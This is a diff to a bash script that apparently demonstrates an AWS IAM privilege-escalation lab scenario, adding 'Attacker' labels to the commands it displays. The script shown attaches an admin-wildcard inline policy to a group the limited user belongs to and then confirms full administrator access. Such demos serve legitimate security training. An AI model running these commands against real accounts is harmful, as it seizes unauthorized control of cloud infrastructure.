@@ -22,12 +22,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -69,7 +71,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $USER_IDENTITY"
 
@@ -78,14 +80,14 @@ if [[ ! $USER_IDENTITY == *"$PRIVESC_USER"* ]]; then
     exit 1
 fi
 
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Confirmed identity as $PRIVESC_USER${NC}\n"
 
 # Step 3: Verify group membership
 echo -e "${YELLOW}Step 3: Verifying $PRIVESC_USER is a member of $TARGET_GROUP${NC}"
-show_cmd "aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text"
+show_cmd "Attacker" "aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text"
 GROUP_MEMBERS=$(aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text)
 if [[ $GROUP_MEMBERS == *"$PRIVESC_USER"* ]]; then
     echo -e "${GREEN}✓ Confirmed: $PRIVESC_USER is a member of $TARGET_GROUP${NC}"
@@ -99,7 +101,7 @@ echo ""
 # Step 4: Check current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Checking current permissions (should be limited)${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
     echo "The group may already have an admin policy attached from a previous run"
@@ -130,7 +132,7 @@ POLICY
 )
 
 # Put the policy on the group
-show_attack_cmd "aws iam put-group-policy --group-name $TARGET_GROUP --policy-name $POLICY_NAME --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
+show_attack_cmd "Attacker" "aws iam put-group-policy --group-name $TARGET_GROUP --policy-name $POLICY_NAME --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
 aws iam put-group-policy \
     --group-name $TARGET_GROUP \
     --policy-name $POLICY_NAME \
@@ -152,7 +154,7 @@ sleep 15
 echo "Testing admin permissions (listing IAM users)..."
 SUCCESS=false
 for i in {1..3}; do
-    show_cmd "aws iam list-users --max-items 3 --output table"
+    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
     if aws iam list-users --max-items 3 --output table 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
         echo -e "${GREEN}✓ Confirmed administrator access through group policy!${NC}\n"
